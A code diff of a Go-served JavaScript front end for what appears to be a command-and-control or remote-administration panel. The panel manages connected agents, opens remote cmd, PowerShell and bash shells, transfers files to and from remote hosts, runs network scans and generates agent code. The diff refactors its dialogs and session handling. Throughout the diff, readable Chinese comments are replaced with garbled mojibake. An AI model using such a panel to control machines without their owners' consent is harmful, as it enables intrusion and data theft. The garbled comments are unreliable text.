@@ -14,6 +14,7 @@ func Js(error_str,web_route,web_js,web_css string, sessionSlice []string) http.H
         }
 		if r.Method == http.MethodGet {
 html := `
+
 if (!window.AgentTaskId) {
     window.AgentTaskId = Math.random().toString(36).substring(2) + Date.now();
 }
@@ -23,11 +24,9 @@ if (!window.main_server) {
 let server_data = [];
 let User_data = [];
 let check_time = [];
-let check_uid = [];
 let shell_list=[];
 let server_plugin = [];
 let chat_slice = [];
-let user_slice = [];
 
 let msgQueues = {};
 let resultQueues = {};
@@ -38,6 +37,7 @@ window.resultTimers = window.resultTimers || {};
 window.serverClientCounts = window.serverClientCounts || {};
 window.onlineTeammates = window.onlineTeammates || [];
 window.terminalSessions = window.terminalSessions || {};
+window.fileManagerSessions = window.fileManagerSessions || {};
 window.netInitTimer = window.netInitTimer || null;
 window.shellInnetData = window.shellInnetData || {};
 
@@ -607,7 +607,12 @@ class WebSocketClient {
                     fileQueues[uid] = Array.isArray(msg.data.data) ?
                         msg.data.data :
                         [];
-                    if (window.activeFileManager &&
+                    const fileManager = window.fileManagerSessions ?
+                        window.fileManagerSessions[uid] :
+                        null;
+                    if (fileManager) {
+                        fileManager.history_file(uid);
+                    } else if (window.activeFileManager &&
                         window.activeFileManager.uid === uid) {
                         window.activeFileManager.history_file(uid);
                     }
@@ -733,11 +738,11 @@ class index{
             }
         }
         var div = document.getElementById('div_conn');
-        // 先清空当前显示
+        // 鍏堟竻绌哄綋鍓嶆樉绀�
         while(div.firstChild){
             div.removeChild(div.firstChild);
         }
-        // 空数组直接显示为空
+        // 绌烘暟缁勭洿鎺ユ樉绀轰负绌�
         if (!clients || !Array.isArray(clients)) {
             console.error("Invalid clients data");
             return;
@@ -851,6 +856,12 @@ class index{
             this.currentTaskId = "";
             this.inputKeydown = this.inputKeydown.bind(this);
         }
+        getDialogNode(selector) {
+            if (this.dialogEl) {
+                return this.dialogEl.querySelector(selector);
+            }
+            return document.querySelector(selector);
+        }
         lain_time(uid, taskid, command) {
             if (!uid) {
                 console.log("uid is empty");
@@ -858,9 +869,9 @@ class index{
             }
             try {
                 let key = uid + "*" + taskid;
-                // 防止重复启动
+                // 闃叉閲嶅鍚姩
                 if(resultTimers[key]){
-                    console.log("已经在获取");
+                    console.log("宸茬粡鍦ㄨ幏鍙�");
                     return false;
                 }
                 resultTimers[key] = setInterval(()=>{
@@ -929,7 +940,7 @@ class index{
             if(!this.uid){
                 return;
             }
-            this.sendjob('agent'); // 创建新的提示符
+            this.sendjob('agent'); // 鍒涘缓鏂扮殑鎻愮ず绗�
             try {
                 const taskid = createRuntimeTaskId("terminal");
                 let result = await webSocketClient.send(
@@ -1003,7 +1014,7 @@ class index{
                 const command = this.currentInput.value.trim();
                 if (command) {
                     await this.get(command);
-                    // 不需要再 await lain_time 和 createInput，这些已在 get 里处理
+                    // 涓嶉渶瑕佸啀 await lain_time 鍜� createInput锛岃繖浜涘凡鍦� get 閲屽鐞�
                 }
             }
         }
@@ -1011,8 +1022,8 @@ class index{
             if(!fileSize || !file_name){
                 return false;
             }
-            let splitSizeInput = document.getElementById('splitSize');
-            let splitSize = splitSizeInput.value
+            let splitSizeInput = this.getDialogNode('#splitSize');
+            let splitSize = splitSizeInput && splitSizeInput.value
                 ? parseFloat(splitSizeInput.value) * 1024 * 1024
                 : 0;
             let file_key = this.uid + "**///**" + file_name + "**///**" + splitSize;
@@ -1032,8 +1043,8 @@ class index{
             if(!path){
                 return;
             }
-            let splitSizeInput = document.getElementById('splitSize');
-            let splitSize = splitSizeInput.value
+            let splitSizeInput = this.getDialogNode('#splitSize');
+            let splitSize = splitSizeInput && splitSizeInput.value
                 ? parseFloat(splitSizeInput.value) * 1024 * 1024
                 : 0;
             let powershell = "GET_U_FILE*//*" + path + "*//*" + splitSize;
@@ -1048,7 +1059,10 @@ class index{
             );
         }
         renderFileList(fileContent, shell_dir) {
-		    const div_file = document.getElementById('file_resp');
+		    const div_file = this.getDialogNode('#file_resp');
+            if (!div_file) {
+                return;
+            }
 		    div_file.innerHTML = '';
 		    const dir_list = fileContent.split("\n");
 		
@@ -1118,7 +1132,7 @@ class index{
 		            });
 		        }
 		
-		        // === 重命名 ===
+		        // === 閲嶅懡鍚� ===
 		        new_file.querySelector('.rename-btn')?.addEventListener('click', (e) => {
 		            e.stopPropagation();
 		            const filenameSpan = new_file.querySelector('.filename');
@@ -1142,10 +1156,10 @@ class index{
                         }
                     );
 		            filenameSpan.innerText = newName;
-		            new_file.dataset.path = newPath; // ⭐ 状态同步
+		            new_file.dataset.path = newPath; // 猸� 鐘舵€佸悓姝�
 		        });
 		
-		        // === 修改时间 ===
+		        // === 淇敼鏃堕棿 ===
 		        new_file.querySelector('.time-btn')?.addEventListener('click', (e) => {
 		            e.stopPropagation();
 		
@@ -1172,7 +1186,7 @@ class index{
 		}
         async history_file(uid) {
             uid = uid || this.uid;
-            const historyParent = document.getElementById('history');
+            const historyParent = this.getDialogNode('#history');
             const historyData = Array.isArray(fileQueues[uid]) ? fileQueues[uid] : [];
             if(historyParent){
                 historyParent.innerHTML='';
@@ -1291,25 +1305,25 @@ class index{
             }
         }
          async move_file(num, cur_dir) {
-            let cur_dir_p = document.getElementById("cur_dir_p");
+            let cur_dir_p = this.getDialogNode("#cur_dir_p");
             if (this.isMovingFile) {
                 console.log("Don't move around....");
                 return;
             }
-            this.isMovingFile = true; // 锁定操作
-            let temp_dir = this.shell_dir; // 保存当前路径
+            this.isMovingFile = true; // 閿佸畾鎿嶄綔
+            let temp_dir = this.shell_dir; // 淇濆瓨褰撳墠璺緞
             try {
                 if (this.uid) {
                     if (num === 1 && cur_dir === 'no') {
-                        this.shell_dir += '/..'; // 返回上级目录
+                        this.shell_dir += '/..'; // 杩斿洖涓婄骇鐩綍
                     } else if (num === 0) {
-                        // 解析目录路径
+                        // 瑙ｆ瀽鐩綍璺緞
                         this.shell_dir += "/" + cur_dir ;
                     }
-                    // 确保 look_file 异步执行
+                    // 纭繚 look_file 寮傛鎵ц
                     let flag = await this.look_file(this.shell_dir);
                     if (!flag) {
-                        this.shell_dir = temp_dir; // 回退路径
+                        this.shell_dir = temp_dir; // 鍥為€€璺緞
                         customLog("!Does not exist or has no permission to access this directory?");
                     }
                     console.log(this.shell_dir);
@@ -1317,29 +1331,36 @@ class index{
             } catch (error) {
                 console.error("An error occurred in move_file:", error);
             } finally {
-                // 保证最终解锁
-                cur_dir_p.textContent = "Path:\t" + this.shell_dir;
+                // 淇濊瘉鏈€缁堣В閿�
+                if (cur_dir_p) {
+                    cur_dir_p.textContent = "Path:\t" + this.shell_dir;
+                }
                 this.isMovingFile = false;
             }
         }
         async move_dir(){
-            let cur_dir_p = document.getElementById("cur_dir_p");
+            let cur_dir_p = this.getDialogNode("#cur_dir_p");
             let temp_dir = this.shell_dir;
-            let directory = document.getElementById("directoryInput").value;
+            let directoryInput = this.getDialogNode("#directoryInput");
+            let directory = directoryInput ? directoryInput.value : "";
             this.shell_dir = directory;
             let flag = await this.look_file(this.shell_dir);
             if (!flag) {
-                this.shell_dir = temp_dir; // 如果 look_file 返回 false，则回退目录
+                this.shell_dir = temp_dir; // 濡傛灉 look_file 杩斿洖 false锛屽垯鍥為€€鐩綍
                 console.log("!Does not exist or has no permission to access this directory?")
             }
             console.log(this.shell_dir);
-            cur_dir_p.textContent="Path:\t"+this.shell_dir;
+            if (cur_dir_p) {
+                cur_dir_p.textContent="Path:\t"+this.shell_dir;
+            }
         }
         get_btn_move(){
-            var btn = document.getElementById('dir-btn');
-            btn.addEventListener('click', async () => {
-                this.move_file(1,'no')
-            })
+            var btn = this.getDialogNode('#dir-btn');
+            if (btn) {
+                btn.addEventListener('click', async () => {
+                    this.move_file(1,'no')
+                });
+            }
         }
 
         switchVer(value){
@@ -1355,7 +1376,7 @@ class index{
         }
     }
     
-    //主页面类
+    //涓婚〉闈㈢被
     class lain_index{
         lain_shell(){
             if(!Username){
@@ -1385,10 +1406,10 @@ class index{
                     osEmoji="🐧";
                 }
                 else if(os.includes("macos")){
-                    osEmoji="🍏";
+                    osEmoji="🍎";
                 }
                 else if(os.includes("android")){
-                    osEmoji="🤖";
+                    osEmoji="📱";
                 }
                 let pluginButtons = "";
                 let pluginParam = key.plugin_parameter;
@@ -1442,7 +1463,7 @@ class index{
                             '</div>' +
                             '<div class="choose-content" id="' + key['uid'] + '-choose-content">' +
                                 '<button type="button" class="console-link" onclick="showTerminalDialog(\'' + key['uid'] + '\', \'' + key['host'] + '\', \'' + key['os'] + '\')">💻</button>' +
-                                '<button type="button" class="console-link file-open-btn" data-uid="' + key['uid'] + '" data-host="' + key['host'] + '" data-dir="' + (key['current_dir'] || './') + '">🗂️</button>' +
+                                '<button type="button" class="console-link file-open-btn" data-uid="' + key['uid'] + '" data-host="' + key['host'] + '" data-dir="' + (key['current_dir'] || './') + '">📁</button>' +
                                 '<button type="button" class="console-link" onclick="showMsgDialog(\'' + key['uid'] + '\', \'' + key['host'] + '\')">📩</button>' +
                                 pluginButtons +
                             '</div>' +
@@ -1489,10 +1510,10 @@ class index{
             dialog.style.backdropFilter = "blur(10px)";
             document.body.appendChild(dialog);
 
-            // 拖动条和内容
+            // 鎷栧姩鏉″拰鍐呭
             dialog.innerHTML =
                 '<div class="terminal-drag-bar" style="position:absolute;top:0;left:0;width:100%;height:36px;cursor:move;background:linear-gradient(90deg, rgba(230,236,243,0.95), rgba(243,247,251,0.9));border-top-left-radius:18px;border-top-right-radius:18px;z-index:10001;border-bottom:1px solid rgba(138,160,178,0.18);"></div>' +
-                '<button class="dialog-close-btn terminal-close-btn" type="button">×</button>' +
+                '<button class="dialog-close-btn terminal-close-btn" type="button">x</button>' +
                 '<div class="shell-container" style="margin-top:34px;display:flex;align-items:center;gap:12px;flex-wrap:wrap;padding:8px 4px 14px 4px;">' +
                 "<label for='options' style='color:#4f6477;font-size:13px;'>Select Shell:</label>" +
                 "<select class='terminal-shell-select' name='options' style='min-width:150px;padding:8px 12px;border-radius:999px;border:1px solid rgba(138,160,178,0.35);background:#fff;color:#314657;'></select>" +
@@ -1503,7 +1524,7 @@ class index{
                 '</div>' +
                 '<link rel="stylesheet" href="/`+web_css+`">';
 
-            // 关闭按钮
+            // 鍏抽棴鎸夐挳
             dialog.querySelector(".terminal-close-btn").onclick = function () {
                 if (terminal) {
                     terminal.stopAllResultsForUid(uid);
@@ -1517,7 +1538,7 @@ class index{
                 dialog.remove();
             };
 
-            // 拖动逻辑（兼容PC和移动端，且窗口不能移出页面）
+            // 鎷栧姩閫昏緫锛堝吋瀹筆C鍜岀Щ鍔ㄧ锛屼笖绐楀彛涓嶈兘绉诲嚭椤甸潰锛�
             const dragBar = dialog.querySelector(".terminal-drag-bar");
             let isDragging = false, offsetX = 0, offsetY = 0, startX = 0, startY = 0;
 
@@ -1535,7 +1556,7 @@ class index{
                 let clientY = e.touches ? e.touches[0].clientY : e.clientY;
                 let newLeft = clientX - offsetX;
                 let newTop = clientY - offsetY;
-                // 限制窗口不移出页面
+                // 闄愬埗绐楀彛涓嶇Щ鍑洪〉闈�
                 const rect = getDialogRect();
                 const winW = window.innerWidth, winH = window.innerHeight;
                 const maxLeft = winW - rect.width;
@@ -1544,7 +1565,7 @@ class index{
                 newTop = clamp(newTop, 0, maxTop > 0 ? maxTop : 0);
                 dialog.style.left = newLeft + "px";
                 dialog.style.top = newTop + "px";
-                dialog.style.transform = ""; // 拖动后取消居中
+                dialog.style.transform = ""; // 鎷栧姩鍚庡彇娑堝眳涓�
             }
 
             function stopMove() {
@@ -1576,7 +1597,7 @@ class index{
             });
 
             setTimeout(() => {
-                // 初始化 shell 选项
+                // 鍒濆鍖� shell 閫夐」
                 const optionsElement = dialog.querySelector(".terminal-shell-select");
                 if (os == "win") {
                     optionsElement.innerHTML = "<option>Shell</option><option value='cmd'>cmd</option><option value='powershell'>powershell</option><option value='custom'>customize shell</option>";
@@ -1586,12 +1607,12 @@ class index{
                     optionsElement.innerHTML = "<option>Shell</option><option value='/system/bin/bash'>/system/bin/bash</option><option value='/system/bin/sh'>/system/bin/sh</option><option value='custom'>customize shell</option>";
                 }
 
-                // 创建 terminal 实例并初始化
+                // 鍒涘缓 terminal 瀹炰緥骞跺垵濮嬪寲
                 terminal = new lain_terminal();
                 terminal.uid = uid;
                 terminal.dialogEl = dialog;
 
-                // 让 terminal 内部管理输入框和事件
+                // 璁� terminal 鍐呴儴绠＄悊杈撳叆妗嗗拰浜嬩欢
                 terminal.inputContainer = dialog.querySelector(".terminal .input-container");
                 terminal.terminalEl = dialog.querySelector(".terminal");
                 window.terminalSessions[uid] = terminal;
@@ -1602,7 +1623,7 @@ class index{
                     dialog.style.zIndex = String((window.dialogZIndexCounter = (window.dialogZIndexCounter || 9999) + 1));
                 });
 
-                // shell切换
+                // shell鍒囨崲
                 optionsElement.addEventListener("change", function () {
                     const selectedValue = this.value;
                     if (selectedValue === "custom") {
@@ -1624,17 +1645,31 @@ class index{
             }, 200);
         }
         showFileDialog(uid, host, dir) {
-            // 检查是否已存在弹窗
-            let dialog = document.getElementById("file-dialog");
+            const dialogId = "file-dialog-" + uid;
+            let dialog = document.getElementById(dialogId);
+            let fileManager = window.fileManagerSessions ? window.fileManagerSessions[uid] : null;
+            if (dialog) {
+                dialog.style.display = "block";
+                dialog.style.zIndex = String((window.dialogZIndexCounter = (window.dialogZIndexCounter || 9999) + 1));
+                if (fileManager) {
+                    window.activeFileManager = fileManager;
+                    if (dir && dir !== fileManager.shell_dir) {
+                        fileManager.shell_dir = dir;
+                        fileManager.look_file(dir);
+                    }
+                }
+                return;
+            }
             if (!dialog) {
                 dialog = document.createElement("div");
-                dialog.id = "file-dialog";
+                dialog.id = dialogId;
+                dialog.dataset.uid = uid;
                 dialog.style.position = "fixed";
                 dialog.style.top = "5%";
                 dialog.style.left = "50%";
                 dialog.style.transform = "translateX(-50%)";
                 dialog.style.background = "#fff";
-                dialog.style.zIndex = 9999;
+                dialog.style.zIndex = String((window.dialogZIndexCounter = (window.dialogZIndexCounter || 9999) + 1));
                 dialog.style.maxWidth = "1100px";
                 dialog.style.width = "95vw";
                 dialog.style.height = "85%";
@@ -1645,14 +1680,12 @@ class index{
                 dialog.style.userSelect = "none";
                 dialog.style.touchAction = "none";
                 document.body.appendChild(dialog);
-            } else {
-                dialog.innerHTML = "";
             }
 
-            // 拖动条和内容
+            // 鎷栧姩鏉″拰鍐呭
             dialog.innerHTML =
                 '<div id="file-drag-bar" style="position:absolute;top:0;left:0;width:100%;height:32px;cursor:move;background:rgba(0,0,0,0.05);border-top-left-radius:8px;border-top-right-radius:8px;z-index:10001;"></div>' +
-                '<button id="file-close-btn" class="dialog-close-btn" type="button">×</button>' +
+                '<button id="file-close-btn" class="dialog-close-btn" type="button">x</button>' +
                 '<div style="display:flex;width:100%;margin-top:32px;position:relative;height:calc(90vh - 48px);overflow:hidden;">' +
                     '<div id="history" class="file-history" style="width:200px;min-width:80px;max-width:80vw;transition:width 0.1s;"></div>' +
                     '<div id="file-history-resizer" style="min-width:6px;cursor:col-resize;background:#e0e0e0;z-index:10;"></div>' +
@@ -1679,12 +1712,18 @@ class index{
                 '</div>' +
                 '<link rel="stylesheet" href="/`+web_css+`">';
 
-            // 关闭按钮
+            // 鍏抽棴鎸夐挳
             dialog.querySelector("#file-close-btn").onclick = function () {
+                if (window.fileManagerSessions) {
+                    delete window.fileManagerSessions[uid];
+                }
+                if (window.activeFileManager === fileManager) {
+                    window.activeFileManager = null;
+                }
                 dialog.remove();
             };
 
-            // 拖动逻辑（兼容PC和移动端，且窗口不能移出页面）
+            // 鎷栧姩閫昏緫锛堝吋瀹筆C鍜岀Щ鍔ㄧ锛屼笖绐楀彛涓嶈兘绉诲嚭椤甸潰锛�
             const dragBar = dialog.querySelector("#file-drag-bar");
             let isDragging = false, offsetX = 0, offsetY = 0;
 
@@ -1702,7 +1741,7 @@ class index{
                 let clientY = e.touches ? e.touches[0].clientY : e.clientY;
                 let newLeft = clientX - offsetX;
                 let newTop = clientY - offsetY;
-                // 限制窗口不移出页面
+                // 闄愬埗绐楀彛涓嶇Щ鍑洪〉闈�
                 const rect = getDialogRect();
                 const winW = window.innerWidth, winH = window.innerHeight;
                 const maxLeft = winW - rect.width;
@@ -1711,7 +1750,7 @@ class index{
                 newTop = clamp(newTop, 0, maxTop > 0 ? maxTop : 0);
                 dialog.style.left = newLeft + "px";
                 dialog.style.top = newTop + "px";
-                dialog.style.transform = ""; // 拖动后取消居中
+                dialog.style.transform = ""; // 鎷栧姩鍚庡彇娑堝眳涓�
             }
 
             function stopMove() {
@@ -1742,7 +1781,7 @@ class index{
                 document.addEventListener("touchend", stopMove);
             });
 
-            // 样式（内容后 append，避免被 innerHTML 覆盖）
+            // 鏍峰紡锛堝唴瀹瑰悗 append锛岄伩鍏嶈 innerHTML 瑕嗙洊锛�
             const style = document.createElement("style");
             style.textContent =
                 ".dir-btn{margin:10px 0;cursor:pointer;color:#007bff;}" +
@@ -1755,13 +1794,17 @@ class index{
                 ".file-manager{min-width:80px;}";
             dialog.appendChild(style);
 
-            // 拖动改变 file-history 和 filecontainer 宽度（联动 file-manager）
+            // 鎷栧姩鏀瑰彉 file-history 鍜� filecontainer 瀹藉害锛堣仈鍔� file-manager锛�
             setTimeout(function () {
-                const resizer = document.getElementById('file-history-resizer');
-                const history = document.getElementById('history');
+                const resizer = dialog.querySelector('#file-history-resizer');
+                const history = dialog.querySelector('#history');
                 const filecontainer = dialog.querySelector('.filecontainer');
-                const parent = resizer.parentElement;
+                const parent = resizer ? resizer.parentElement : null;
                 let resizing = false, startX = 0, startWidth = 0, parentWidth = 0, resizerWidth = 0;
+
+                if (!resizer || !history || !filecontainer || !parent) {
+                    return;
+                }
 
                 resizer.addEventListener('mousedown', function(e) {
                     resizing = true;
@@ -1777,7 +1820,7 @@ class index{
                 function resize(e) {
                     if (!resizing) return;
                     let newWidth = startWidth + (e.clientX - startX);
-                    // 限制最小最大宽度
+                    // 闄愬埗鏈€灏忔渶澶у搴�
                     newWidth = Math.max(80, Math.min(newWidth, parentWidth - 80 - resizerWidth));
                     history.style.width = newWidth + 'px';
                     filecontainer.style.width = (parentWidth - newWidth - resizerWidth) + 'px';
@@ -1792,27 +1835,32 @@ class index{
                 }
             }, 200);
 
-            // 逻辑
+            // 閫昏緫
             setTimeout(function () {
                 const fliemanage = new lain_terminal();
+                fileManager = fliemanage;
                 fliemanage.uid = uid;
+                fliemanage.dialogEl = dialog;
+                window.fileManagerSessions[uid] = fliemanage;
                 window.activeFileManager = fliemanage;
                 
-                let hostname = document.getElementById("hostname");
-                hostname.innerText = "Host:" + host;
+                let hostname = dialog.querySelector("#hostname");
+                if (hostname) {
+                    hostname.innerText = "Host:" + host;
+                }
 
-                // 上传表单
-                document.getElementById("uploadForm").addEventListener("submit",
+                // 涓婁紶琛ㄥ崟
+                dialog.querySelector("#uploadForm").addEventListener("submit",
                 async function(event){
                     event.preventDefault();
-                    const fileInput = document.getElementById("uploadFile");
-                    const file = fileInput.files[0];
+                    const fileInput = dialog.querySelector("#uploadFile");
+                    const file = fileInput && fileInput.files ? fileInput.files[0] : null;
                     if(!file){
                         customAlert("Please select a file");
                         return;
                     }
-                    const splitSizeInput = document.getElementById("splitSize");
-                    const splitSize = splitSizeInput.value ? parseFloat(splitSizeInput.value) * 1024 * 1024 : 0;
+                    const splitSizeInput = dialog.querySelector("#splitSize");
+                    const splitSize = splitSizeInput && splitSizeInput.value ? parseFloat(splitSizeInput.value) * 1024 * 1024 : 0;
                     const file_name = fliemanage.shell_dir + "/" + file.name;
                     try{
                         await webSocketClient.sendFile(
@@ -1839,17 +1887,22 @@ class index{
                     }
                 });
 
-                // 返回上级目录
-                document.getElementById("dir-btn").onclick = function() {
+                // 杩斿洖涓婄骇鐩綍
+                dialog.querySelector("#dir-btn").onclick = function() {
                     fliemanage.move_file(1, "no");
                 };
 
-                // 跳转目录
-                document.getElementById("moveDirButton").onclick = function() {
+                // 璺宠浆鐩綍
+                dialog.querySelector("#moveDirButton").onclick = function() {
                     fliemanage.move_dir();
                 };
 
-                // 初始化
+                dialog.addEventListener("mousedown", function() {
+                    window.activeFileManager = fliemanage;
+                    dialog.style.zIndex = String((window.dialogZIndexCounter = (window.dialogZIndexCounter || 9999) + 1));
+                });
+
+                // 鍒濆鍖�
                 fliemanage.shell_dir = dir || "./";
                 fliemanage.history_file(uid);
                 fliemanage.look_file(fliemanage.shell_dir);
@@ -1857,17 +1910,23 @@ class index{
             }, 200);
         }
         showMsgDialog(uid, host) {
-            // 检查是否已存在弹窗
-            let dialog = document.getElementById("msg-dialog");
+            const dialogId = "msg-dialog-" + uid;
+            let dialog = document.getElementById(dialogId);
+            if (dialog) {
+                dialog.style.display = "block";
+                dialog.style.zIndex = String((window.dialogZIndexCounter = (window.dialogZIndexCounter || 9999) + 1));
+                return;
+            }
             if (!dialog) {
                 dialog = document.createElement("div");
-                dialog.id = "msg-dialog";
+                dialog.id = dialogId;
+                dialog.dataset.uid = uid;
                 dialog.style.position = "fixed";
                 dialog.style.top = "10%";
                 dialog.style.left = "50%";
                 dialog.style.transform = "translateX(-50%)";
                 dialog.style.background = "#fff";
-                dialog.style.zIndex = 9999;
+                dialog.style.zIndex = String((window.dialogZIndexCounter = (window.dialogZIndexCounter || 9999) + 1));
                 dialog.style.maxWidth = "700px";
                 dialog.style.width = "90vw";
                 dialog.style.maxHeight = "90vh";
@@ -1879,21 +1938,19 @@ class index{
                 dialog.style.userSelect = "none";
                 dialog.style.touchAction = "none";
                 document.body.appendChild(dialog);
-            } else {
-                dialog.innerHTML = "";
             }
 
-            // 拖动条和内容
+            // 鎷栧姩鏉″拰鍐呭
             dialog.innerHTML =
                 '<div id="msg-drag-bar" style="position:absolute;top:0;left:0;width:100%;height:32px;cursor:move;background:rgba(0,0,0,0.05);border-top-left-radius:8px;border-top-right-radius:8px;z-index:10001;"></div>' +
-                '<button id="msg-close-btn" class="dialog-close-btn" type="button">×</button>' +
+                '<button id="msg-close-btn" class="dialog-close-btn" type="button">x</button>' +
                 '<div style="display: flex; align-items: center; margin-top:32px;">' +
                     '<h2>Msg list</h2>' +
                     "<p id='hostname' style='margin-left: 25px;'>Host:" + host + "</p>" +
                 '</div>' +
                 '<div id="msg-container">loading...</div>';
 
-            // 拖动逻辑（兼容PC和移动端，且窗口不能移出页面）
+            // 鎷栧姩閫昏緫锛堝吋瀹筆C鍜岀Щ鍔ㄧ锛屼笖绐楀彛涓嶈兘绉诲嚭椤甸潰锛�
             const dragBar = dialog.querySelector("#msg-drag-bar");
             let isDragging = false, offsetX = 0, offsetY = 0;
 
@@ -1911,7 +1968,7 @@ class index{
                 let clientY = e.touches ? e.touches[0].clientY : e.clientY;
                 let newLeft = clientX - offsetX;
                 let newTop = clientY - offsetY;
-                // 限制窗口不移出页面
+                // 闄愬埗绐楀彛涓嶇Щ鍑洪〉闈�
                 const rect = getDialogRect();
                 const winW = window.innerWidth, winH = window.innerHeight;
                 const maxLeft = winW - rect.width;
@@ -1920,7 +1977,7 @@ class index{
                 newTop = clamp(newTop, 0, maxTop > 0 ? maxTop : 0);
                 dialog.style.left = newLeft + "px";
                 dialog.style.top = newTop + "px";
-                dialog.style.transform = ""; // 拖动后取消居中
+                dialog.style.transform = ""; // 鎷栧姩鍚庡彇娑堝眳涓�
             }
 
             function stopMove() {
@@ -1951,12 +2008,12 @@ class index{
                 document.addEventListener("touchend", stopMove);
             });
 
-            // 关闭按钮
+            // 鍏抽棴鎸夐挳
             dialog.querySelector("#msg-close-btn").onclick = function () {
                 dialog.remove();
             };
 
-            // 样式（内容后 append，避免被 innerHTML 覆盖）
+            // 鏍峰紡锛堝唴瀹瑰悗 append锛岄伩鍏嶈 innerHTML 瑕嗙洊锛�
             const style = document.createElement("style");
             style.textContent =
                 ".msg-item {background: white; border: 1px solid #ccc; padding: 10px; margin-bottom: 8px; position: relative;}" +
@@ -1970,7 +2027,7 @@ class index{
                 ".msg-drop-placeholder {border: 1px dashed #9eb3c7; border-radius: 10px; margin-bottom: 8px; background: rgba(228,236,245,0.45);}";
             dialog.appendChild(style);
 
-            // 逻辑
+            // 閫昏緫
             setTimeout(function() {
                 
                 const msgContainer = dialog.querySelector("#msg-container");
@@ -2053,7 +2110,7 @@ class index{
                 function renderMsgText(rawMsg) {
 				    let taskId = "";
 				    let msgContent = rawMsg;
-				    // 提取 taskid
+				    // 鎻愬彇 taskid
 				    const colonIndex = rawMsg.indexOf(":");
 				    if (colonIndex >= 0) {
 				        taskId = rawMsg.substring(0, colonIndex).trim();
@@ -2102,7 +2159,7 @@ class index{
 				            result = msgContent;
 				    }
 				
-				    // 统一在这里拼回 taskid
+				    // 缁熶竴鍦ㄨ繖閲屾嫾鍥� taskid
 				    return taskId ? result + "   taskid: " + taskId : result;
 				}
                 function createMessageItem({
@@ -2160,7 +2217,7 @@ class index{
                     let expanded = false;
                 
                     if (expandable && text.length > 10) {
-                        const shortText = text.slice(0, 10) + "…";
+                        const shortText = text.slice(0, 10) + "鈥�";
                         span.textContent = shortText;
                         span.style.cursor = "pointer";
                         span.onclick = () => {
@@ -2183,7 +2240,7 @@ class index{
                         copy.textContent = "📋";
                         copy.onclick = () => {
                             navigator.clipboard.writeText(text).then(() => {
-                                copy.textContent = "✔";
+                                copy.textContent = "✔️";
                                 setTimeout(() => copy.textContent = "📋", 1000);
                             });
                         };
@@ -2192,7 +2249,7 @@ class index{
                 
                     if (onDelete) {
                         const del = document.createElement("button");
-                        del.textContent = "🗑";
+                        del.textContent = "🗑️";
                         del.onclick = () => onDelete(msgDiv);
                         btnGroup.appendChild(del);
                     }
@@ -2340,7 +2397,7 @@ class index{
                     }
                 }
 
-                // 删除
+                // 鍒犻櫎
                 async function deleteMsg(msgDiv) {
                     const requestList = getRequestList();
                     const idx = requestList ?
@@ -2365,7 +2422,7 @@ class index{
                         console.error("delete msg error:",err);
                     }
                 }
-                // 发送 reorder 请求（支持 before / after）
+                // 鍙戦€� reorder 璇锋眰锛堟敮鎸� before / after锛�
                 async function sendReorderByIndex(s_id,t_id,mode){
                     if(
                         s_id === -1 ||
@@ -2398,7 +2455,7 @@ class index{
                 }
                 loadMessages();
                 dialog._msgInterval = setInterval(loadMessages, 30000);
-                // 弹窗关闭时清理定时器
+                // 寮圭獥鍏抽棴鏃舵竻鐞嗗畾鏃跺櫒
                 dialog.querySelector("#msg-close-btn").addEventListener("click", function() {
                     if (dialog._msgInterval) clearInterval(dialog._msgInterval);
                 });
@@ -2422,7 +2479,7 @@ class index{
                         taskid: AgentTaskId
                     }
                 );
-                // change 成功
+                // change 鎴愬姛
                 this.updateUserData(
                     uid,
                     remarks,
@@ -2673,11 +2730,11 @@ class lain_net{
             customLog("Please select an agent");
             return false;
         }
-        let optionValue = document.getElementById('net_options').value; //选项
-        let targetValue = document.getElementById('net_target').value; //目标
-        let targetListValue = document.getElementById('net_target_list').value; //探测范围
-        var sleepTimeValue = document.getElementById('net_sleep_time').value; //休眠时间
-        let customSleepTimeValue = document.getElementById('custom_sleep_time').value; //自定义时间
+        let optionValue = document.getElementById('net_options').value; //閫夐」
+        let targetValue = document.getElementById('net_target').value; //鐩爣
+        let targetListValue = document.getElementById('net_target_list').value; //鎺㈡祴鑼冨洿
+        var sleepTimeValue = document.getElementById('net_sleep_time').value; //浼戠湢鏃堕棿
+        let customSleepTimeValue = document.getElementById('custom_sleep_time').value; //鑷畾涔夋椂闂�
         if (sleepTimeValue === 'custom') {
             sleepTimeValue = customSleepTimeValue;
         }
@@ -2687,7 +2744,7 @@ class lain_net{
         console.log('Delay:', sleepTimeValue);
         
         if (isNaN(sleepTimeValue) || sleepTimeValue < 1) {
-            sleepTimeValue = 1; // 默认最小值为1
+            sleepTimeValue = 1; // 榛樿鏈€灏忓€间负1
         }
 
         if(optionValue === "scan"){
@@ -2911,7 +2968,7 @@ class lain_server {
         });
         jsonData.cert = certContent;
         jsonData.key = keyContent;
-        // 添加用户名
+        // 娣诲姞鐢ㄦ埛鍚�
         jsonData.username = Username;
         try{
             const responsePromise = webSocketClient.waitForMessage(
@@ -3123,7 +3180,7 @@ class lain_server {
                 if (!code) {
                     code = "/*code*/";
                 }
-                // 按 redirectToAgentCode 的参数顺序调用（protocol, os, server, path, ... , code, windows_pro）
+                // 鎸� redirectToAgentCode 鐨勫弬鏁伴『搴忚皟鐢紙protocol, os, server, path, ... , code, windows_pro锛�
                 this.redirectToAgentCode(
                     server.protocol,
                     os,
@@ -3164,7 +3221,7 @@ class lain_server {
 
                     dialog.innerHTML =
                         "<div class='plugin-dialog-header'>" +
-                            "<button type='button' class='plugin-close-btn' onclick='closeStartServerDialog()' aria-label='close plugin dialog'>×</button>" +
+                            "<button type='button' class='plugin-close-btn' onclick='closeStartServerDialog()' aria-label='close plugin dialog'>x</button>" +
                             "<h3>plugin</h3>" +
                         "</div>" +
                         "<form id='pluginForm' method='POST' class='plugin-form'>" +
@@ -3193,7 +3250,7 @@ class lain_server {
                         dialog.style.opacity = "1";
                     });
 
-                    // 绑定参数加减按钮事件（首次创建时）
+                    // 缁戝畾鍙傛暟鍔犲噺鎸夐挳浜嬩欢锛堥娆″垱寤烘椂锛�
                     const addBtn = dialog.querySelector('#addParameterBtn');
                     const removeBtn = dialog.querySelector('#removeParameterBtn');
                     const countDisplay = dialog.querySelector('#parameterCount');
@@ -3477,30 +3534,30 @@ class lain_server {
             const currentHeader = server ?
                 (server.response_head || server.responseHead || server.ResponseHead || "") :
                 "";
-            // 检查是否已加载样式
+            // 妫€鏌ユ槸鍚﹀凡鍔犺浇鏍峰紡
             if (!document.getElementById("modify-server-style")) {
                 const styleLink = document.createElement("link");
                 styleLink.id = "modify-server-style";
